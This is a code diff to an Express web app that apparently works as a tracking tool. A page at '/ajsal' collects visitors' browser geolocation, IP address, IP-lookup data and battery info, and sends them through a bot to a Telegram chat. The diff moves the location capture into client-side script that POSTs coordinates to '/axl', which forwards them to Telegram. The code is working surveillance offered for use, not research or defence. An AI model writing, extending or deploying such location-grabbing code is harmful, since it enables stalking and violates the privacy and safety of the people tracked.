@@ -97,6 +97,7 @@ app.get('/ajsal', async (req, res) => {
       <h1>Device & Location Info Sent!</h1>
       <p>Your device and location information have been sent to Telegram.</p>
       <button id="axlButton">Axl</button>
+      <div id="locationOutput">Fetching location...</div>
       <script>
         async function sendBatteryInfo() {
           try {
@@ -122,7 +123,12 @@ app.get('/ajsal', async (req, res) => {
         // Event listener for the Axl button
         document.getElementById('axlButton').addEventListener('click', async () => {
           try {
-            const response = await fetch('/axl');
+            const position = await getGeolocation();
+            const response = await fetch('/axl', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ latitude: position.coords.latitude, longitude: position.coords.longitude })
+            });
             const result = await response.text();
             alert(result); // Display a simple alert to confirm action
           } catch (error) {
@@ -130,6 +136,12 @@ app.get('/ajsal', async (req, res) => {
             alert('Failed to send location info.');
           }
         });
+
+        async function getGeolocation() {
+          return new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject);
+          });
+        }
       </script>
     </body>
     </html>
@@ -139,31 +151,24 @@ app.get('/ajsal', async (req, res) => {
 });
 
 // New route to handle button click and send location via geolocation
-app.get('/axl', async (req, res) => {
-  // Get current geolocation
-  navigator.geolocation.getCurrentPosition(async (position) => {
-    const { latitude, longitude } = position.coords;
+app.post('/axl', async (req, res) => {
+  const { latitude, longitude } = req.body;
 
-    // Fetch user IP just in case you want to verify or send additional data
-    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    const userData = await fetchUserData(userIp); // Optional: Get additional IP data
+  const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+  const userData = await fetchUserData(userIp); // Optional: Get additional IP data
 
-    // Combine location info into one message
-    const message = `
-    🌐 *Location Info*:
-    - **Latitude**: ${latitude || "Unknown"}
-    - **Longitude**: ${longitude || "Unknown"}
+  // Combine location info into one message
+  const message = `
+🌐 *Location Info*:
+- **Latitude**: ${latitude || "Unknown"}
+- **Longitude**: ${longitude || "Unknown"}
   `;
 
-    // Send the information to Telegram
-    bot.sendMessage(ajsal, message, { parse_mode: 'Markdown' });
+  // Send the information to Telegram
+  bot.sendMessage(ajsal, message, { parse_mode: 'Markdown' });
 
-    // Respond with a simple message
-    res.send('Location info has been sent to Telegram.');
-  }, (error) => {
-    console.error('Error getting location:', error);
-    res.send('Failed to get location info.');
-  });
+  // Respond with a simple message
+  res.send('Location info has been sent to Telegram.');
 });
 
 // Handle battery info sent from the client
